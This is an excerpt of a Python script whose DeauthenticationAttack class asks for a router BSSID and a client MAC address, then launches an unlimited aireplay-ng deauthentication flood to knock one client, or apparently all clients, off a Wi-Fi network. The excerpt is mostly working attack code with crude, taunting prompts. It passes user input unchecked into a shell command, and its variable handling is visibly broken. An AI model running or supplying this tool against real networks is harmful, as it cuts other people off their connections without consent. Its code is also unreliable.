...
class DeauthenticationAttack:
        ...
        @classmethod
        def kick_client_router(cls):
                cls.router_bssid_one = raw_input('[+] Enter BSSID for Router:')
                print('[+] Router MAC address set to: {}'.format(cls.router_bssid_one))
                time.sleep(2)
                cls.kick_client_router = raw_input('[+] Enter client MAC address to kick: ')
                ...
                launch_attack = raw_input('[+] Attack ready to launch attack! Launch attack(y/n): ')
                if(launch_attack == 'y') or (launch_attack == 'yes'):
                        print('[+] Shifts about to get realz...') 
                        time.sleep(3) 
                        launch_dos_attack = 'aireplay-ng -0 0 -a {} -c {} {}'.format(cls.router_bssid_one, cls.kick_client, cls.iface_one) 


                        subprocess.call(launch_dos_attack, shell=True)
                elif(launch_attack == 'n') or (launch_attack == 'no'):
                        print('[+] Ahh what a waste of time you idiot!')
                        time.sleep(3)
                        exit()
        @classmethod
        def kick_all_from_router(cls):
                cls.router_bssid_two = raw_input('[+] Enter BSSID for router:')
                ...
                if(launch_the_attack == 'y') or (launch_the_attack == 'yes'):
                        print('[+] Launching the attacking and attacking the fuck out of it...')
                        time.sleep(3) 
        ...
        def get_option(cls):
                ...
                if(cls.option == str(1)):
                        ...
                        time.sleep(2)
                        DeauthenticationAttack.kick_client_router()
